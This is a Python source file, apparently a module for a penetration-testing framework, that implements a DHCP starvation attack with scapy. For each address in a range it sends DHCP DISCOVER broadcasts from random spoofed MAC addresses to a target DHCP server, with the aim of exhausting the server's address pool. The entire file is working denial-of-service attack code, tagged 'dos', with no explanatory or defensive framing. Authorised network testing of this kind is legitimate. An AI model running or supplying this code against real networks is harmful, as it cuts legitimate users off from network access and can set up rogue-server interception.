import ipaddress

from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp
from scapy.volatile import RandMAC

from module import Module, Type


class DHCPStarvation(Module):

    def __init__(self):
        super().__init__("dhcp_starvation",
                         ["dhcp", "starvation", "dos"],
                         "dhcp starvation")

        self.add_option("INTERFACE", "network interface", required=True, type=Type.interface)
        self.add_option("RHOST", "target dhcp server", required=True, type=Type.host)
        self.add_option("IP-RANGE", "range of ip addresses to request", required=True, type=Type.string)

    def run(self):
        for ip in list(map(str, ipaddress.IPv4Network(self.ip_range).hosts())):
            mac = RandMAC()
            pkt = (Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
                   IP(src="0.0.0.0", dst="255.255.255.255") /
                   UDP(sport=68, dport=67) /
                   BOOTP(op=1, chaddr=mac) /
                   DHCP(options=[("message-type", "discover"), ("requested_addr", ip), ("server-id", self.rhost), ("end")]))
            sendp(pkt, iface=self.interface, verbose=False)
